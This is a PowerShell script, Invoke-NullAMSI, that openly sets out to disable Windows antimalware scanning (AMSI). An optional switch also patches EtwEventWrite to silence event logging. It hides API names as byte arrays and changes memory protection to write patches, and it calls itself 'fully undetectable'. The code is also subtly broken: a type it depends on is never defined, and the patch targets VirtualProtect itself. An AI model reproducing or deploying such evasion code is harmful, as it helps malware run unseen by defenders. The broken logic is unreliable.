function Invoke-NullAMSI {
    param
    (
        [Parameter(ParameterSetName = 'Interface',
                   Mandatory = $false,
                   Position = 0)]
        [switch]
        $v,

        [Parameter(ParameterSetName = 'Interface',
                   Mandatory = $false,
                   Position = 0)]
        [switch]
        $etw
    )

    # Verbose 
    if ($v) {
        $VerbosePreference="Continue"
    }

    ### Obfuscated functions and code ###
    
    # Obtaining the address of a Winapi function using native functions with Reflection 
    function Get-Function
    {
        Param(
            [string] $module,
            [string] $function
        )
        $moduleHandle = $GetModule.Invoke($null, @($module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $moduleHandle)
        $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $function))
    }

    # Creating delegate dynamically to call native functions
    function Get-Delegate
    {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
            [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
            [Parameter(Position = 2)] [Type] $retType = [Void]
        )
        $type = [AppDomain]::("Curren" + "tDomain").DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('QM', $false).
        DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
        $delegate = $type.CreateType()
        $marshalClass::("GetDelegate" +"ForFunctionPointer")($funcAddr, $delegate)
    }

    Write-host "[*] Executing AMSI Patch" -ForegroundColor Cyan

    try {
        Add-Type -AssemblyName System.Windows.Forms
    }
    catch {
        Throw "[!] Failed to add WinForms assembly"
    }

    $marshalClass = [System.Runtime.InteropServices.Marshal]

    # Obfuscate function names with ASCII bytes
    $bytesGetProc = [Byte[]](0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73)
    $bytesGetMod =  [Byte[]](0x47, 0x65, 0x74, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65)

    # Convert byte arrays to strings
    $GetProc = [System.Text.Encoding]::ASCII.GetString($bytesGetProc)
    $GetMod = [System.Text.Encoding]::ASCII.GetString($bytesGetMod)

    # Get the address of GetModule function
    $GetModule = $unsafeMethodsType.GetMethod($GetMod)
    if ($GetModule -eq $null) {
        Throw "[!] Error obtaining address for $GetMod"
    }

    $GetAddres = $unsafeMethodsType.GetMethod($GetProc)
    if ($GetAddres -eq $null) {
        Throw "[!] Error obtaining address for $GetProc"
    }

    # Create 4msiInit patch function address
    $bytes4msiInit = [Byte[]](0x41, 0x6D, 0x73, 0x69, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65)
    $bytes4msi = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
    $4msi = [System.Text.Encoding]::ASCII.GetString($bytes4msi)
    $4msiInit = [System.Text.Encoding]::ASCII.GetString($bytes4msiInit)

    $4msiAddr = Get-Function $4msi $4msiInit
    if ($4msiAddr -eq $null) {
        Throw "[!] Error obtaining address for $4msiInit"
    }

    ### Modify methods to use a more flexible approach ###

    Write-Verbose "[*] Patching providers with advanced obfuscation"
    
    # Define the patch for provider scan function
    $PATCH = [byte[]] (0x90, 0x90, 0x90, 0x90, 0x90, 0x90)  # No-op patch, could be used for different effects

    # Apply patch dynamically
    $patchAddress = Get-Function "kernel32.dll" "VirtualProtect"
    $protectDelegate = Get-Delegate $patchAddress @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())

    Write-Verbose "[*] Changing scan function protection to PAGE_EXECUTE_READWRITE"
    if (!$protectDelegate.Invoke($patchAddress, 1, 0x40, [ref]$p)) {
        Throw "[!] Error changing memory protection"
    }

    # Apply the patch
    try {
        $marshalClass::Copy($PATCH, 0, [IntPtr]$patchAddress, 6)
    } catch {
        Throw "[!] Failed to apply the patch at $patchAddress"
    }

    Write-Host "[*] AMSI bypass successful, protection patched." -ForegroundColor Green

    if ($etw) {
        Write-host "[*] Disabling ETW Logging" -ForegroundColor Cyan

        $etwAddr = Get-Function "ntdll.dll" "EtwEventWrite"
        if ($etwAddr -eq $null) {
            Throw "[!] Error obtaining ETW address"
        }

        Write-Verbose "[*] Changing ETW function protection"
        if (!$protectDelegate.Invoke($etwAddr, 1, 0x40, [ref]$p)) {
            Throw "[!] Error changing ETW function permissions"
        }

        # Apply the RET patch
        try {
            $marshalClass::WriteByte($etwAddr, 0xC3)
        } catch {
            Throw "[!] Error writing patch to ETW function"
        }

        Write-Host "[*] ETW patch successful" -ForegroundColor Green
    }

    Write-Host "[*] ReFUD complete!" -ForegroundColor Green
}
